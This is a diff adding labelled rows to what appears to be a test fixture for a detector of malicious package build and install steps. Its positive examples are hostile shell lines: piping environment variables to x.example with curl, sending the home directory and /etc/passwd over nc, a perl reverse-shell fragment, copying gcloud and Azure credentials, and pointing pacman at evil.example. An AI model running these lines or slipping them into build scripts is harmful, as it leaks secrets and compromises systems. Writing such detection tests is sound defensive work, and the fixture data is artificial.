@@ -234,3 +234,13 @@ pacman-tamper	+	install	echo 'Server = http://evil.example/$repo' >> /etc/pacman
 pacman-tamper	+	install	cp x.conf /etc/pacman.d/x.conf
 pacman-tamper	-	build	grep -q Server /etc/pacman.d/mirrorlist
 pacman-tamper	-	install	cat /etc/pacman.conf
+env-dump	+	build	env | curl -d @- https://x.example/e
+env-dump	+	install	printenv > /tmp/e
+env-dump	+	file	cat /proc/self/environ
+env-dump	-	build	env CC=clang make
+exfil-nc	+	build	tar c ~ | nc x.example 9
+exfil-nc	+	install	nc x.example 9 < /etc/passwd
+exfil-nc	-	build	install -Dm755 ncdu "$pkgdir/usr/bin/ncdu"
+revshell	+	file	perl -e 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))'
+cred-access	+	build	cp -r ~/.config/gcloud /tmp/g
+cred-access	+	install	tar cf /tmp/a.tar ~/.azure
